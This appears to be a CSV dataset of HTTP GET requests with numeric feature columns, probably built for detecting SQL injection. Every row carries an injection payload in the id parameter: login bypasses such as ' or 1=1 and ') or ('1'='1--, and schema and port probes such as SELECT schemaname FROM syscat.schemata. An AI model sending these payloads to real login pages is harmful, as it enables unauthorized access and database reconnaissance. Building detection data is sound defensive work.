38,1,200,3527,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,7810,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,4057,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,4179,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,3394,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,3291,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,7125,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,2060,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,5938,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,4262,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,2229,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,1795,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,5910,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,3862,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,3239,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,2855,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
38,1,200,2545,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
18,1,200,4841,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,7917,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,4806,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,7712,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,5238,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,3195,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,3828,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,7522,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,6592,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,7921,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,2252,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,6699,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,3353,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,2512,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,5233,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,5801,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,1520,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,2613,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,4090,7,2,4,1,1,GET ?id== HTTP/1.1
18,1,200,1546,7,2,4,1,1,GET ?id== HTTP/1.1
25,1,200,4052,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,3163,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,5147,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,2989,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,6758,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,2760,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,4697,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,3790,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,3724,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,7611,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,2981,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,5549,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,1422,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,3282,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,2676,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,1513,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,1496,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,1605,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,3074,7,7,5,2,1,GET login/?id='# HTTP/1.1
36,1,200,1574,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,1221,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,4602,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,5968,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,7123,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,1662,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,7071,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,6881,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,7189,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,2685,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,3474,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,6764,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,5713,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,3701,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,2401,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,1823,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,6750,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,7605,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,6604,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,4367,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
36,1,200,5400,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
31,1,200,1196,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,2993,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,3360,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,5984,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,1779,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,4573,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,2078,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,5753,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,2756,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,5564,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,4642,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,6566,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,2822,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,2547,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,2353,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,3726,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,3921,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,7454,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,4841,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,2723,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,6137,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,2832,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,5084,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,3526,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
40,1,200,6912,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,7135,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,4878,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,4443,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,4039,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,6770,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,2867,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,5917,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,5061,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,3914,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,2974,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,5562,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,1133,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,7522,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,4069,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,5447,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,2034,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,6508,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,3814,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,4088,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,1516,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,7299,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,1710,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,6666,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,2549,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,4231,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
26,1,200,5202,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,2337,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,6127,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,6280,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,3297,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,4563,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,3082,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,2990,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,1233,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,2794,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,1080,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,4196,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,3266,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,3056,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,1714,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,4048,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,2778,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,7358,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,2795,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,2947,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,3006,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,2206,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,6964,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,2135,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,4578,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,2386,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
26,1,200,2163,7,4,3,1,1,GET ?id=" or "" " HTTP/1.1
39,1,200,7823,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,2246,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,4952,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,2445,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,1469,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,1689,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,6205,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,7866,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,5478,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,1317,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,5834,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,4179,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,5797,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,2295,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,2300,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
38,1,200,7849,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,6032,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,3293,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,3590,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,4102,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,1850,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,3061,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,5007,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,5304,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,2247,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,7387,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,1477,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,7447,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,5983,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,7753,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,2781,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,2589,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,4363,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,4475,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,5725,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
38,1,200,3735,7,9,6,3,1,GET login/?id=") or "1"="1"/* HTTP/1.1
56,1,200,2029,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,5760,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,2741,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,5785,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,6410,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,1939,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,1669,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,1428,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,7085,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,7827,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,6250,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,6261,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,3313,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,2532,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,4343,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,6915,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,5558,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,7223,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,3127,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,7894,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,5432,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,7270,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,6052,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
48,1,200,2470,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2804,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4358,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7484,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5289,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,3451,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5861,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1243,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1914,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4638,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5186,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7029,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1877,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4540,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,3600,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2792,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6367,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6973,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5268,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,3053,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1826,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2736,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2823,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1790,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1208,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5741,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7481,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4731,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5915,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5616,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6777,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4570,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7791,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6126,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5711,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1945,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2615,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2656,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4497,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6107,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
38,1,200,6588,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,7173,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,7257,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,1672,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,5436,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,3672,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,1041,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,7481,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,1237,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,3758,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,5334,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,3013,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,7212,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,3932,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,7791,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,5378,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,1815,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,6170,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,3484,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,2603,7,9,7,2,1,GET login/?id=") or ("1"="1"# HTTP/1.1
38,1,200,2481,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,2923,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,1449,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,1553,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,7512,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,2477,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,4652,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,5584,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,1315,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,3658,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,7105,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,6973,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,1287,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,7272,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,3187,7,9,8,1,1,GET ?id=admin") or ("1"="1"-- HTTP/1.1
34,1,200,7589,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,3937,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,1656,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,1627,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5038,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,3825,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5985,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,3387,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,7318,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,4360,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,7016,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,6072,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,1602,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,6440,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,7711,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,7384,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,6592,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,4276,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,2949,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,2611,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5385,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,7555,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,2853,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,6311,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,7959,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,4921,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5289,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,6605,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,2286,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,1244,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5504,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,4866,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5574,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5656,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,3651,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,4413,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5578,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,6546,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
